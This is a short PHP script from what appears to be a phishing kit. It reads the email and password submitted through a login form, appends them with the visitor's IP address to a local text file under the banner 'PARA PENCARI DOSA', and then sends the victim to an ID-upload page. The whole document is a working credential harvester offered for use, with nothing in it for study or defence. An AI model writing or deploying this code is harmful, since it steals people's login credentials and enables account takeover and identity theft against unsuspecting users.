<?php 

if(isset($_POST['email']) || isset($_POST['pass'])) {
	$email = $_POST['email'];
    $pass  = $_POST['pass'];
	$ip    = $_SERVER['REMOTE_ADDR'];

	if(empty($email) || empty($pass)) {
		echo "<scrip>alert('Complete All Data!'); document.location='./';</script>";
	} else {
        $file = "bosmudaOKEYYYYYYYYYYYYYYY.txt";
        
        $handle = fopen($file, 'a');
        fwrite($handle, "======================================PARA PENCARI DOSA======================================");
        fwrite($handle, "\n");
        fwrite($handle, "::  EMAIL     :: ");
        fwrite($handle, "$email");
        fwrite($handle, "\n");
        fwrite($handle, "::  PASSWORD  :: ");
        fwrite($handle, "$pass");
        fwrite($handle, "\n");
        fwrite($handle, "::  IP        :: ");
        fwrite($handle, "$ip");
        fwrite($handle, "\n");
        if(fclose($handle)) {
            echo "<script>location.href='upload-id.html';</script>";
        }
	}
}